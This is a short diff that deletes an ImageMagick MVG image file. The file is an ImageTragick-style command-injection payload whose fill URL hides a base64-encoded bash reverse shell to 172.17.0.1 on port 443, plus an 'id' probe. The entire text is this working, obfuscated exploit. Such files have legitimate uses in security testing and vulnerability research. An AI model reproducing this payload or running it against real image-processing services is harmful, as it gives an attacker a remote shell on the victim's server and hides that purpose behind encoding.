@@ -1,4 +1,0 @@
-push graphic-context
-viewbox 0 0 640 480
-fill 'url(https://127.0.0.0/oops.jpg?`echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzE3Mi4xNy4wLjEvNDQzIDA+JjE= | base64 -d | bash`"||id " )'
-pop graphic-context
